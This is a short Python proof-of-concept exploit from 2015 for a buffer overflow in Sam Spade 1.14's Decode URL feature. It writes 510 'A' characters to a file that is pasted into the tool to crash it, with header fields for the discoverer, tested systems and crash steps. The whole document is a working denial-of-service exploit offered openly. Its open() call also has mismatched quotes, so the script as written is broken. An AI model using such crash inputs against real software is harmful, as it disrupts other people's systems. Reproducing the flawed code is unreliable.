#!/usr/bin/env python
# Exploit Title     : Sam Spade 1.14 Decode URL Buffer Overflow  Crash PoC
# Discovery by      : Vivek Mahajan - c3p70r
# Discovery Date    : 19/11/2015
# Vendor Homepage   : http://samspade.org
# Software Link     : http://www.majorgeeks.com/files/details/sam_spade.html
# Tested Version    : 1.14
# Vulnerability Type: Denial of Service / Proof Of Concept/ Memory Overwrite
# Tested On     : Windows XP SP2 ,Windows 7 SP1 x64, Windows 8.1 x64 PRO, Windows 10 x64
# Crash Point   : Go to Tools > Decode URL> Enter the contents of 'spade.txt' > OK , Note: Do Remove the http://



buffer = "A"*510

file = open("spade.txt, 'w')
file.write(buffer)
file.close()
            

# Follow on twitter @vik.create